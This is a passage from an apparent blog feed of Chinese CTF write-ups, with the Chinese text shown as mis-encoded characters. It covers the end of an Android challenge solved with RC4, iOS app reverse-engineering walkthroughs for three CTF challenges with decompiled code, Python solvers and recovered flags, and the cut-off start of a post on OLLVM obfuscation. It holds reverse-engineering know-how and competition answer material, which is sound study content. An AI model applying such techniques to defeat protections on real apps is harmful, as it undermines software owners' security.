class="hljs-number">0x43</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x4C</span>,<span class="hljs-number">0x60</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x1E</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(data))<br>key = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x11</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x66</span>])<br>decrypted = rc4(data, key)<br><span class="hljs-built_in">print</span>(decrypted)<br><span class="hljs-comment">#b&#x27;flag&#123;a2_b3_c4_d4_hahahaha&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>æœ€åå› ä¸ºé•¿åº¦æ˜¯31ï¼Œè€Œflagæ±‚å‡ºæ¥26ï¼Œä¸€çœ¼é¡¶é’ˆæŠŠa2å˜æˆaaï¼Œè¿™é“é¢˜éš¾ç»·çš„ç‚¹åœ¨äºé˜Ÿå‹é€šè¿‡åŠ¨è°ƒsoå’Œpatchå†…å­˜å¾—åˆ°äº†ä¸Šé¢çš„flagï¼Œä½†æ˜¯ä¸¤ä¸ªäººä¸€ç›´æ²¡æƒ³é€šä¸ºå•¥æ˜¯31ï¼Œå¦å¤–åœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­ç¡®å®å‡ºç°äº†aaaaå˜æˆa4çš„æƒ…å†µ</p><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/1749393476890-15cd2535-45ad-4ead-b5f5-5876362a7897.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iosé€†å‘æ•´ç†</title>
    <link href="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/"/>
    <url>/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>å‚è€ƒé“¾æ¥ï¼š<a href="https://xz.aliyun.com/news/15176">https://xz.aliyun.com/news/15176</a></p><p><a href="https://xz.aliyun.com/news/15176">https://dwj1210.github.io/2018/05/21/%E4%B8%80%E6%AC%A1%20iOS%20CTF%20%E5%AE%9E%E6%88%98%20WriteUp/</a></p><p>å›½å†…ctfæ¯”èµ›ä¸­å¾ˆå°‘å‡ºç°iosçš„é¢˜ç›®ï¼Œæ‰¾äº†å¾ˆä¹…ä¸€å…±å°±æ‰¾åˆ°ä¸‹é¢ä¸‰é“</p><h1 id="ä¸€èˆ¬æ€è·¯"><a href="#ä¸€èˆ¬æ€è·¯" class="headerlink" title="ä¸€èˆ¬æ€è·¯"></a>ä¸€èˆ¬æ€è·¯</h1><p>å°†ipaæ–‡ä»¶åç¼€æ”¹ä¸ºzipï¼Œè§£å‹ä¹‹åè¿›å…¥Payloadï¼Œä¼šæœ‰ä¸€ä¸ª.appæ–‡ä»¶å¤¹ï¼Œè¿›å»æ‰¾åˆ°äºŒè¿›åˆ¶æ–‡ä»¶å°±èƒ½æ”¾åˆ°idaé‡Œåˆ†æ</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744294933785-b2897347-4161-459b-84b0-a1cd9575dcfa.png" class="" title="img"><p>mainå‡½æ•°ä¼¼ä¹éƒ½æ²¡ä»€ä¹ˆç”¨</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744336582681-d78c4a83-b2df-409d-83ac-074c40b86d3f.png" class="" title="img"><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744336590527-eb056655-0d64-4248-80f4-e0966cee62ef.png" class="" title="img"><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744336623761-6a6de096-6ea6-4290-84f3-6ac1cf4719a0.png" class="" title="img"><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744352329292-07623eae-be23-4fa8-9bf8-6bf22254ce50.png" class="" title="img"><p>ä¸€èˆ¬éƒ½æ˜¯ç›´æ¥æœå­—ç¬¦ä¸²ç„¶åäº¤å‰å¼•ç”¨æ‰¾åˆ°å…³é”®å‡½æ•°ç»§ç»­åˆ†æ</p><h1 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h1><h2 id="2025æ•°å­—ä¸­å›½appèµ›é“IOSApp"><a href="#2025æ•°å­—ä¸­å›½appèµ›é“IOSApp" class="headerlink" title="2025æ•°å­—ä¸­å›½appèµ›é“IOSApp"></a>2025æ•°å­—ä¸­å›½appèµ›é“IOSApp</h2><p>é¢˜ç›®æè¿°ï¼šå®‰å…¨å®¡è®¡å‘˜å®¡æŸ¥å‘ç°revealFlagå‡½æ•°æ¯”è¾ƒå¯ç–‘ï¼Œè¯·åˆ†æä»£ç ï¼Œå¸®å¥¹æ‰¾åˆ°ä¸ä¹‹ç›¸å…³çš„flag</p><p>æœç´¢stringæ‰¾åˆ°ä¸€ä¸ªæ‹¼æ¥base64</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744293487229-38a07e64-2089-4b80-9384-7c00353b839e.png" class="" title="img"><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744293465827-c36d1257-7dc3-4564-821b-6d3894d566ba.png" class="" title="img"><p>swiftå°±æ˜¯ç”¨cppå†™çš„ï¼Œæ‰€ä»¥çœ‹ä¸Šå»å¾ˆåƒcppçš„é£æ ¼</p><p>è°ƒç”¨obfuscatedFlag.unsafeMutableAddressor()ï¼Œè¡¨ç¤ºä» obfuscatedFlag è·å– flag çš„å¯†æ–‡</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744353363244-3b0dd580-2d08-4dfd-b0dd-67935d5089f8.png" class="" title="img"><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744353378259-9a04b0ef-1bd4-4a5a-9ba8-7db0518379da.png" class="" title="img"><p>Collection.map<A>(_:)(closure #1 in revealFlag(if:), â€¦)è¡¨ç¤ºå¯¹ String ç±»å‹è°ƒç”¨ mapï¼Œå¯¹æ¯ä¸€ä¸ªåŠ å¯†å­—ç¬¦åº”ç”¨äº†è§£å¯†å‡½æ•°ï¼ˆrevealFlagï¼‰</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744335517298-457f947a-e152-42d1-b0ca-9cf7048b40cf.png" class="" title="img"><p>è¿›å…¥è§£å¯†å‡½æ•°ï¼ŒCharacter.asciiValue.getter(); è¡¨ç¤ºè·å–å­—ç¬¦çš„ ascii å€¼</p><p>result &#x3D; UnsignedInteger&lt;&gt;.init<A>(_:)(&amp;v15, â€¦);å¯èƒ½ä¼šè®©ä¼ å…¥çš„ v15 çš„ä¸€éƒ¨åˆ†ï¼ˆåœ¨å†…å­˜ä¸­ç´§é‚»çš„æ•°æ®ï¼‰å†™å…¥äº† v16 çš„å€¼ï¼Œè€Œv15ç­‰äº1ï¼Œä¹Ÿå°±æ˜¯æ¯ä¸ªå­—ç¬¦çš„asciiå€¼éƒ½å‡ä¸€</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744336230391-84ba390a-4ec0-4496-89ac-062df5176de4.png" class="" title="img"><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744353426302-2487cda3-ed12-400d-aa07-e87a4ff7b634.png" class="" title="img"><h2 id="2024ByteCTFæé™é€ƒè„±"><a href="#2024ByteCTFæé™é€ƒè„±" class="headerlink" title="2024ByteCTFæé™é€ƒè„±"></a>2024ByteCTFæé™é€ƒè„±</h2><p>010æŸ¥çœ‹æ ¼å¼ï¼Œä¿®æ”¹åç¼€åè§£å‹ï¼Œç›´æ¥æœç´¢å­—ç¬¦ä¸²å‘ç°flagæ ¼å¼</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1727833033895-972bc39d-5746-456f-9f6a-8e66fdeb93a1.png" class="" title="img"><p>åé¢æœ‰uuidçš„å­—ç¬¦ä¸²ï¼Œç›´æ¥äº¤ä¸å¯¹ï¼Œä¸”ä¸Šé¢æœ‰a-fï¼ŒçŒœæµ‹æ˜¯æŸç§æ˜ å°„</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1727832979869-ec0b2e4a-061b-4617-b640-a1b4923cb475.png" class="" title="img"><p>å­—ç¬¦ä¸²äº¤å‰å¼•ç”¨æ‰¾åˆ°å…³é”®å‡½æ•°ï¼Œä¸‹é¢åˆ†ææ•´ä¸ªå‡½æ•°</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1727832913856-8be73c26-133a-45e1-817b-2f66e3c9b992.png" class="" title="img"><p>selfç›¸å½“äºä»å†…å­˜åŠ è½½ï¼Œè€Œè¾“å…¥çš„ç›´æ¥æ˜¯æœ€åçš„flag</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744353086384-4774bfe5-8270-4bca-9dfd-75e94012c6d5.png" class="" title="img"><p>{a67be199da4b-b092-bd3e-e777-a67be199da4b} sha256åŠ å¯†åå¾—åˆ°6c9838a3c6810bdb2633ed5910b8547c09a7a4c08bf69ae3a95c5c37f9e8f57e</p><p>å–å­ä¸²ï¼Œç¬¬ä¸€ä¸ªå˜é‡æ˜¯æºå­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå˜é‡æ— æ³•æŸ¥æ‰¾ï¼Œç¬¬ä¸‰ä¸ªå˜é‡çŒœæµ‹æ˜¯ä¸‹æ ‡ï¼Œç¬¬å››ä¸ªå˜é‡æ˜¯é•¿åº¦</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744337418837-6389aab5-2fd8-439c-a5cb-520797dbe2b8.png" class="" title="img"><p>å„å–ä¸€æ®µæ›¿æ¢åä½œä¸ºflagä¸€éƒ¨åˆ†</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1727836470277-64459f21-ac4e-4aee-b25e-459eb13c2f78.png" class="" title="img"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ByteCTF</span>&#123;c9838b3c-<span class="hljs-number">6810</span>-<span class="hljs-number">8</span>a3d-<span class="hljs-number">8</span>a3c-<span class="hljs-number">8</span>a3c6810bdb2&#125;<br></code></pre></td></tr></table></figure><h2 id="2017iOS-CTF"><a href="#2017iOS-CTF" class="headerlink" title="2017iOS CTF"></a>2017iOS CTF</h2><p>æ ¹æ®stringä¸¤æ¬¡äº¤å‰å¼•ç”¨æ‰¾åˆ°å…³é”®å‡½æ•°</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744355432747-2631d95a-378e-47e6-b573-3bffb6bae9ee.png" class="" title="img"><p>self-&gt;passwordæ˜¯è¾“å…¥ï¼Œé•¿åº¦ä¸º32ï¼Œä¸self-&gt;plainç›¸æ¯”ï¼Œç›¸ç­‰ä¸”self-&gt;fgä¸º0åˆ™missed</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744355396688-ccbc4c43-6d06-4e53-bc8f-eb18096f99f0.png" class="" title="img"><p>self-&gt;plainè¦ä» ViewController  ç±»é‡Œçš„-init æˆ– -viewDidLoad ç­‰åˆå§‹åŒ–å‡½æ•°ä¸­æ‰¾</p><p>self-&gt;plain ä» secret.txt ä¸­è¯»å–å¹¶base64è§£å¯†</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744355726169-04564607-c99d-424b-909a-5195bc70cf7e.png" class="" title="img"><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744355824502-bd2c0e90-c004-4894-a2ad-9394d721129b.png" class="" title="img"><p>è¾“å…¥å’Œpdå‰16ä½ç›¸ç­‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)objc_msgSend(v10, <span class="hljs-string">&quot;isEqualToString:&quot;</span>, v12) )<br>  &#123;<br>    fg = self-&gt;fg;<br>    objc_release(v12);<br>    objc_release(v10);<br>    <span class="hljs-keyword">if</span> ( !fg )<br>    &#123;<br>      v14 = objc_msgSend(&amp;OBJC_CLASS_$_UIAlertView, <span class="hljs-string">&quot;alloc&quot;</span>);<br>      v15 = objc_msgSend(<br>              v14,<br>              <span class="hljs-string">&quot;initWithTitle:message:delegate:cancelButtonTitle:otherButtonTitles:&quot;</span>,<br>              CFSTR(<span class="hljs-string">&quot;Wrong~&quot;</span>),<br>              CFSTR(<span class="hljs-string">&quot;Sorry, you missed the flag!&quot;</span>),<br>              <span class="hljs-number">0LL</span>,<br>              CFSTR(<span class="hljs-string">&quot;Ok&quot;</span>),<br>              <span class="hljs-number">0LL</span>);<br>      objc_msgSend(v15, <span class="hljs-string">&quot;show&quot;</span>);<br>      v16 = v15;<br>LABEL_14:<br>      objc_release(v16);<br>      <span class="hljs-keyword">goto</span> LABEL_15;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    objc_release(v12);<br>    objc_release(v10);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( self-&gt;fg )<br>  &#123;<br>    NSLog(&amp;stru_10000C488.isa, self-&gt;pd);<br>    v17 = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      v18 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)objc_msgSend(v8, <span class="hljs-string">&quot;characterAtIndex:&quot;</span>, v17);<br>      <span class="hljs-keyword">if</span> ( v18 != (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)objc_msgSend(self-&gt;pd, <span class="hljs-string">&quot;characterAtIndex:&quot;</span>, v17) )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">if</span> ( ++v17 &gt;= <span class="hljs-number">16</span> )<br>      &#123;<br>        v19 = <span class="hljs-number">16LL</span>;<br>        <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>        &#123;<br>          v20 = (<span class="hljs-type">unsigned</span> __int8)objc_msgSend(v8, <span class="hljs-string">&quot;characterAtIndex:&quot;</span>, v19);<br>          v21 = (<span class="hljs-type">unsigned</span> __int8)((<span class="hljs-type">unsigned</span> __int8)objc_msgSend(self-&gt;pd, <span class="hljs-string">&quot;characterAtIndex:&quot;</span>, v19) ^ v20) + <span class="hljs-number">5</span>;<br>          v22 = v19 - <span class="hljs-number">16</span>;<br>          v23 = objc_msgSend(self-&gt;key, <span class="hljs-string">&quot;objectAtIndex:&quot;</span>, v22);<br>          v24 = objc_retainAutoreleasedReturnValue(v23);<br>          v25 = (<span class="hljs-type">unsigned</span> __int8)objc_msgSend(v24, <span class="hljs-string">&quot;intValue&quot;</span>);<br>          objc_release(v24);<br>          <span class="hljs-keyword">if</span> ( v21 != v25 )<br>            <span class="hljs-keyword">goto</span> LABEL_15;<br>          v19 = v22 + <span class="hljs-number">17</span>;<br>          <span class="hljs-keyword">if</span> ( v19 &gt; <span class="hljs-number">31</span> )<br>          &#123;<br>            v26 = objc_msgSend(&amp;OBJC_CLASS_$_NSString, <span class="hljs-string">&quot;stringWithFormat:&quot;</span>, CFSTR(<span class="hljs-string">&quot;flag&#123;%@&#125;&quot;</span>), v8);<br>            v27 = objc_retainAutoreleasedReturnValue(v26);<br>            v28 = objc_msgSend(&amp;OBJC_CLASS_$_UIAlertView, <span class="hljs-string">&quot;alloc&quot;</span>);<br>            v29 = objc_msgSend(<br>                    v28,<br>                    <span class="hljs-string">&quot;initWithTitle:message:delegate:cancelButtonTitle:otherButtonTitles:&quot;</span>,<br>                    CFSTR(<span class="hljs-string">&quot;Congratulation!&quot;</span>),<br>                    v27,<br>                    <span class="hljs-number">0LL</span>,<br>                    CFSTR(<span class="hljs-string">&quot;Ok&quot;</span>),<br>                    <span class="hljs-number">0LL</span>);<br>            objc_msgSend(v29, <span class="hljs-string">&quot;show&quot;</span>);<br>            objc_release(v29);<br>            v16 = (UIAlertView *)v27;<br>            <span class="hljs-keyword">goto</span> LABEL_14;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>è¦æƒ³ä½¿å¾—self-&gt;fgä¸º1ï¼Œåœ¨viewDidLoadä¸­self-&gt;pdåªèƒ½ç­‰äº2333333333333ï¼Œå¯æ˜¯pdæœ¬èº«éƒ½æ²¡æœ‰16ä½</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744356634704-9a75a39e-14b6-4335-ba84-8dd981e3cb64.png" class="" title="img"><p>pdç”±generateç”Ÿæˆ</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744359093325-e5e1a3fc-527a-471d-a533-248e647e447b.png" class="" title="img"><p>ç”±generateæ–¹æ³•å†³å®šæ¯”è¾ƒçš„å­—ç¬¦ä¸²</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744359115517-85dcfe81-c115-4c5b-abbe-f70c435f1a85.png" class="" title="img"><p>debé‡Œçš„libæ–‡ä»¶hookäº†generateæ–¹æ³•</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744359022952-2c194e4b-5826-4215-aeaa-ec251fcf5e4e.png" class="" title="img"><p>å¦‚æœæœ‰ç¯å¢ƒçš„è¯å¯ä»¥ç›´æ¥æŠŠè¿™ä¸ª dylib æ‹·è´åˆ° &#x2F;Library&#x2F;MobileSubstrate&#x2F;DynamicLibraries&#x2F; ç›®å½•ä¸‹ï¼Œè®©ç¨‹åºè¿è¡Œçš„æ—¶å€™åŠ è½½</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744359817979-e45b0b56-695b-480d-b90d-697c4ff4e5d3.png" class="" title="img"><p>æˆ‘è¿™é‡Œæ²¡æœ‰ç¯å¢ƒï¼Œé€‰æ‹©ç›´æ¥åˆ†æç¨‹åºï¼Œé¦–å…ˆè·å–å¹¶åŠ è½½å›¾ç‰‡</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744360014845-d896b9cb-bad2-4722-9e4d-1c0e73e027c0.png" class="" title="img"><p>å–å‰ 32 ä¸ªå­—èŠ‚ä¸­ä¸‹æ ‡ä¸ºå¥‡æ•°çš„å­—èŠ‚ï¼Œå°† v6 çš„å‰16å­—ç¬¦æ›¿æ¢æˆæ··æ·†åçš„ v10</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744360086304-05268bf9-e38d-4924-b455-f90a1a13ee6d.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">byte_7FA0 = [<br>    <span class="hljs-number">0x06</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x45</span>,<br>    <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x4B</span><br>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_custom_string</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read(<span class="hljs-number">32</span>)<br><br>    filtered = [data[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>, <span class="hljs-number">2</span>)]<br>    hex_str = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;b:02x&#125;</span>&#x27;</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> filtered)<br><br>    transformed = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        orig_char = <span class="hljs-built_in">ord</span>(hex_str[i])<br>        xor_char = byte_7FA0[i] ^ orig_char<br>        transformed += <span class="hljs-built_in">chr</span>(xor_char)<br><br>    final_str = transformed + hex_str[<span class="hljs-number">16</span>:]<br>    <span class="hljs-keyword">return</span> final_str<br><br>result = generate_custom_string(<span class="hljs-string">&quot;flag_in_secret_.jpg&quot;</span>)<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#by_7he0s_ho0k_ls4800e1647866004d</span><br></code></pre></td></tr></table></figure><p>å16ä½ç›¸äº’å¼‚æˆ–+5ä¹‹åç­‰äºå¯†æ–‡key</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744360744354-67fc7451-e0cf-4bf9-bf79-8fecc90b5469.png" class="" title="img"><p>å¯†æ–‡åªæœ‰14ä½ï¼ŒçŒœæµ‹10å’Œ8é‡å¤å‡ºç°</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744360625386-9073ffa2-2f72-4b57-9e1c-3a3ce0206c46.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">p1=<span class="hljs-string">&#x27;by_7he0s_ho0k_ls&#x27;</span><br>pd=<span class="hljs-string">&#x27;4800e1647866004d&#x27;</span><br>tmp=<span class="hljs-string">&#x27;&#x27;</span><br>key=[<span class="hljs-number">112</span>,<span class="hljs-number">16</span>,<span class="hljs-number">86</span>,<span class="hljs-number">72</span>,<span class="hljs-number">33</span>,<span class="hljs-number">115</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">16</span>,<span class="hljs-number">10</span>,<span class="hljs-number">10</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>,<span class="hljs-number">19</span>,<span class="hljs-number">82</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)):<br>    tmp+=<span class="hljs-built_in">chr</span>((key[i]-<span class="hljs-number">5</span>)^<span class="hljs-built_in">ord</span>(pd[i]))<br><span class="hljs-built_in">print</span>(p1+tmp)<br><span class="hljs-comment">#by_7he0s_ho0k_ls_3asy_23333333:)</span><br></code></pre></td></tr></table></figure><p>è¶…å‡ºéƒ¨åˆ†ç”¨flagåŒ…è£¹å³å¯</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744361089049-a1cec87b-1325-452f-beb9-ae0218a1efcb.png" class="" title="img"><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">flag&#123;<span class="hljs-meta">by</span><span class="hljs-number">_7</span>he<span class="hljs-number">0</span>s<span class="hljs-number">_</span>ho<span class="hljs-number">0k</span><span class="hljs-number">_</span>ls<span class="hljs-number">_3</span>asy<span class="hljs-number">_23333333</span>:)&#125;<br></code></pre></td></tr></table></figure><p>ç»ƒä¹ é¢˜ï¼š<a href="https://ivrodriguez.com/mobile-ctf/">https://ivrodriguez.com/mobile-ctf/</a></p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>OLLVMæ··æ·†soæ–‡ä»¶åˆæ¢</title>
    <link href="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/"/>
    <url>/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h1><p>LLVM æ˜¯ä¸€ä¸ªå¼€æºçš„ç¼–è¯‘å™¨åŸºç¡€æ¶æ„ï¼Œå¹¿æ³›åº”ç”¨äºç¼–è¯‘å™¨å’Œç¨‹åºåˆ†æ</p><p>LLVM çš„æ ¸å¿ƒç»„ä»¶ï¼š</p><ul><li>LLVM Core Librariesï¼šæä¾›ç”¨äºç¼–è¯‘å™¨å¼€å‘çš„æ ¸å¿ƒå·¥å…·é›†ï¼ŒåŒ…æ‹¬ä»£ç ç”Ÿæˆã€ä¼˜åŒ–ã€ç›®æ ‡æœºå™¨æè¿°ç­‰</li><li>Clangï¼šä¸€ä¸ªåŸºäº LLVM çš„ Cã€C++ã€Objective-C ç¼–è¯‘å™¨å‰ç«¯</li><li>LLVM IRï¼ˆIntermediate Representatio nï¼‰ï¼šä¸€ç§ç±»ä¼¼æ±‡ç¼–çš„ä¸­é—´è¡¨ç¤ºè¯­è¨€ï¼Œæ˜¯ LLVM çš„æ ¸å¿ƒæŠ½è±¡ã€‚ä»£ç åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­å…ˆè¢«è½¬æ¢ä¸º LLVM IRï¼Œéšåè¿›è¡Œå„ç§ä¼˜åŒ–ï¼Œå†ç”Ÿæˆç›®æ ‡æœºå™¨ç </li><li>LLVM Optimizerï¼šå¯¹ LLVM IR è¿›è¡Œå„ç§ä¼˜åŒ–ï¼Œå¦‚å¾ªç¯ä¼˜åŒ–ã€å†…è”å±•å¼€ç­‰ï¼Œä»¥æå‡æ€§èƒ½</li><li>LLVM Code Generatorï¼šå°†ä¼˜åŒ–åçš„ LLVM IR è½¬æ¢ä¸ºç‰¹å®šå¹³å°çš„æœºå™¨ç </li><li>Linkerï¼šLLVM ä¹ŸåŒ…å«äº†ä¸€äº›é“¾æ¥å™¨å·¥å…·ï¼ˆå¦‚ LLDï¼‰ï¼Œç”¨äºå°†ç¼–è¯‘å¥½çš„ç›®æ 